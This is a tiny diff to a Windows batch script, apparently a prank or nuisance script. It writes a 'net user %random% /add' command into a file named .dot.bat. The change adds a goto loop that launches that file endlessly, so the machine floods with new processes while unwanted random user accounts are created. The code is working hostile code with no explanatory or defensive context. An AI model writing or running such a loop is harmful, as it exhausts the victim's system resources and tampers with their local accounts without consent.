@@ -8,4 +8,6 @@ pause
 cls
 color a
 echo net user %random% /add > .dot.bat
+:meh
 start .dot.bat
+goto meh
